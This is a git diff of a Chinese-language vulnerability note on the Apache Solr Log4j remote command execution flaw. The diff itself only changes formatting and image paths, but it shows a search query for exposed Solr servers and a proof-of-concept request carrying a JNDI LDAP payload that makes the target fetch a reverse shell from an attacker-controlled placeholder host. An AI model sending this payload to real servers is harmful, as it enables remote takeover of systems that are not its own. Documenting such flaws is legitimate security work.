@@ -1,4 +1,4 @@
-# Apache Solr Log4j 组件 远程命令执行漏洞 
+# Apache Solr Log4j 组件 远程命令执行漏洞
 
 ## 漏洞描述
 
@@ -20,7 +20,7 @@ app="APACHE-Solr"
 
 登录页面
 
-![](images/202205251622273.png)
+![](../.gitbook/assets/202205251622273.png)
 
 验证 POC
 
@@ -28,4 +28,4 @@ app="APACHE-Solr"
 /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
 ```
 
-![](images/202205251622876.png)
+![](../.gitbook/assets/202205251622876.png)
